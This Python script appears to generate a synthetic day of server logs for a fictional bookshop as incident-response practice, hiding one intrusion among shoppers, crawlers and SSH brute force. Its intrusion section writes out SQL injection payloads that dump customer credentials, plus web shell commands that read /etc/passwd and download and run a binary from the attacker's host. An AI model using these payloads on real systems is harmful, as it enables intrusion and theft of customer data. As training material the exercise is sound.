#!/usr/bin/env python3
"""Generate 24 hours of telemetry from Lantern Books' web server lb-web-03 (10.40.2.13), 2026-11-02 UTC:
nginx access and error logs, Suricata alerts and the auth log, with one intrusion buried in shoppers,
crawlers and SSH brute force. Fixed seed. Descriptive only: log lines, no tooling."""
import json
import random
from datetime import datetime, timedelta, timezone

R = random.Random(20261102)
DAY = datetime(2026, 11, 2, tzinfo=timezone.utc)
VICTIM, ATT, HOST = "10.40.2.13", "203.0.113.66", "lb-web-03"
def at(h, m=0, s=0): return DAY + timedelta(hours=h, minutes=m, seconds=s)
def rnd_t(): return DAY + timedelta(seconds=R.randrange(24 * 3600))
BROWSERS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Version/18.1 Safari/605.1.15"]
SHOPPERS = [f"198.51.100.{n}" for n in range(10, 120)] + [f"192.0.2.{n}" for n in range(20, 90)]
web, err, ids, auth = [], [], [], []
def req(t, ip, meth, url, st, size, ua): web.append((t, ip, meth, url, st, size, ua))

# ---- shoppers and crawlers
for _ in range(3200):
    t, ip = rnd_t(), R.choice(SHOPPERS)
    url = R.choice([f"/products.php?id={R.randrange(1, 400)}&cat={R.randrange(1, 12)}", "/", "/cart.php", "/checkout.php",
                    f"/search.php?q={R.choice(['mystery', 'cookbooks', 'select+editions', 'union+station+novel', 'maps'])}",
                    "/static/site.css", "/static/app.js"])
    req(t, ip, "POST" if url.startswith("/checkout") and R.random() < 0.5 else "GET", url,
        R.choices([200, 304, 404], [90, 7, 3])[0], R.randrange(800, 40000), R.choice(BROWSERS))
for _ in range(600):
    req(rnd_t(), R.choice(["192.0.2.201", "192.0.2.202"]), "GET", f"/products.php?id={R.randrange(1, 400)}&cat={R.randrange(1, 12)}",
        200, R.randrange(5000, 30000), "Mozilla/5.0 (compatible; ExampleBot/2.1; +https://bot.example.org)")
for m in range(0, 24 * 60, 5):                       # the uptime check, also with curl
    req(at(0, m), "10.40.0.5", "GET", "/healthz", 200, 17, "curl/8.5.0")

# ---- the intrusion: SQL injection in the cat parameter, from 01:58
inj = ["1%27+ORDER+BY+6--+-", "1%27+UNION+SELECT+1,2,3,4,5,6--+-",
       "1%27+UNION+SELECT+1,table_name,3,4,5,6+FROM+information_schema.tables--+-",
       "1%27+UNION+SELECT+1,column_name,3,4,5,6+FROM+information_schema.columns+WHERE+table_name=%27customers%27--+-",
       "1%27+UNION+SELECT+1,email,password_hash,card_last4,5,6+FROM+customers--+-"]
for i, p in enumerate(inj * 3):
    req(at(1, 58, i * 9), ATT, "GET", f"/products.php?id=7&cat={p}", 200, 2100 + (480000 if "FROM+customers" in p else R.randrange(0, 900)),
        BROWSERS[0])
err.append((at(1, 58, 3), f'*112 FastCGI sent in stderr: "PHP message: PHP Warning: mysqli_query(): (21000/1222): The used SELECT statements have a different number of columns in /var/www/shop/products.php on line 41" while reading response header from upstream, client: {ATT}, server: shop.lantern-books.example, request: "GET /products.php?id=7&cat=1 HTTP/1.1"'))
# admin panel login with the dumped credentials, then an upload
req(at(2, 6), ATT, "POST", "/admin/login.php", 302, 410, BROWSERS[0])
req(at(2, 7), ATT, "POST", "/admin/media/upload.php", 200, 812, BROWSERS[0])
SHELL = "/uploads/2026/11/img_cache.php"
for i, c in enumerate(["id", "uname%20-a", "cat%20/etc/passwd",
                       "wget%20http://203.0.113.66:8081/k%20-O%20/var/tmp/.font-cache", "chmod%20+x%20/var/tmp/.font-cache",
                       "/var/tmp/.font-cache%20%26"]):
    req(at(2, 9, i * 40), ATT, "GET", f"{SHELL}?c={c}", 200, R.randrange(40, 900), "curl/8.5.0")
for _ in range(40):
    err.append((rnd_t(), f'*{R.randrange(100, 999)} open() "/var/www/shop/static/{R.choice(["favicon.ico", "old.css", "banner.gif"])}" failed (2: No such file or directory), client: {R.choice(SHOPPERS)}, server: shop.lantern-books.example'))

# ---- auth log: brute force, staff with keys, one password login
botnet = [f"203.0.113.{n}" for n in range(120, 150)]
for _ in range(1400):
    t, ip = rnd_t(), R.choice(botnet)
    u = R.choice(["root", "admin", "ubuntu", "test", "oracle", "postgres", "www-data"])
    auth.append((t, f"sshd[{R.randrange(1000, 9999)}]: Failed password for {'' if u in ('root', 'ubuntu', 'www-data') else 'invalid user '}{u} from {ip} port {R.randrange(30000, 65000)} ssh2"))
for _ in range(30):
    auth.append((rnd_t(), f"sshd[{R.randrange(1000, 9999)}]: Accepted publickey for {R.choice(['nadia', 'tom'])} from 10.40.0.21 port {R.randrange(30000, 65000)} ssh2: ED25519 SHA256:x"))
auth.append((at(2, 31, 4), f"sshd[4412]: Accepted password for shopsync from {ATT} port 50544 ssh2"))
auth.append((at(2, 31, 5), "sshd[4412]: pam_unix(sshd:session): session opened for user shopsync(uid=1003) by (uid=0)"))
auth.append((at(2, 33, 0), "sudo:  shopsync : TTY=pts/0 ; PWD=/home/shopsync ; USER=root ; COMMAND=/usr/bin/crontab -e"))

# ---- Suricata
def alert(t, src, sp, dst, dp, sig, sid, sev):
    ids.append((t, {"timestamp": t.strftime("%Y-%m-%dT%H:%M:%S.%f+0000"), "event_type": "alert", "src_ip": src, "src_port": sp,
                    "dest_ip": dst, "dest_port": dp, "proto": "TCP", "alert": {"signature": sig, "signature_id": sid, "severity": sev}}))
for _ in range(260):
    alert(rnd_t(), R.choice(botnet), R.randrange(30000, 65000), VICTIM, 22, "ET SCAN Potential SSH Scan", 2001219, 2)
for _ in range(60):
    alert(rnd_t(), R.choice(SHOPPERS), R.randrange(30000, 65000), VICTIM, 443, "ET SCAN Suspicious inbound to MySQL port 3306", 2010937, 2)
for i in range(6):
    alert(at(1, 58, i * 20), ATT, R.randrange(40000, 60000), VICTIM, 443, "ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT", 2006446, 1)
alert(at(2, 10, 3), VICTIM, 41822, ATT, 8081, "ET POLICY Executable or ELF downloaded via HTTP non-standard port", 2019714, 1)

# ---- write
def ts_web(t): return t.strftime("%d/%b/%Y:%H:%M:%S +0000")
with open("/out/lb-web03-access.log", "w") as f:
    for t, ip, meth, url, st, size, ua in sorted(web):
        f.write(f'{ip} - - [{ts_web(t)}] "{meth} {url} HTTP/1.1" {st} {size} "-" "{ua}"\n')
with open("/out/lb-web03-error.log", "w") as f:
    for t, msg in sorted(err):
        f.write(f'{t.strftime("%Y/%m/%d %H:%M:%S")} [error] 2211#2211: {msg}\n')
with open("/out/lb-web03-eve.json", "w") as f:
    for t, e in sorted(ids, key=lambda x: x[0]):
        f.write(json.dumps(e) + "\n")
with open("/out/lb-web03-secure.log", "w") as f:
    for t, msg in sorted(auth):
        f.write(f'{t.strftime("%Y-%m-%dT%H:%M:%S.000000+00:00")} {HOST} {msg}\n')
print(len(web), len(err), len(ids), len(auth), len(web) + len(err) + len(ids) + len(auth))
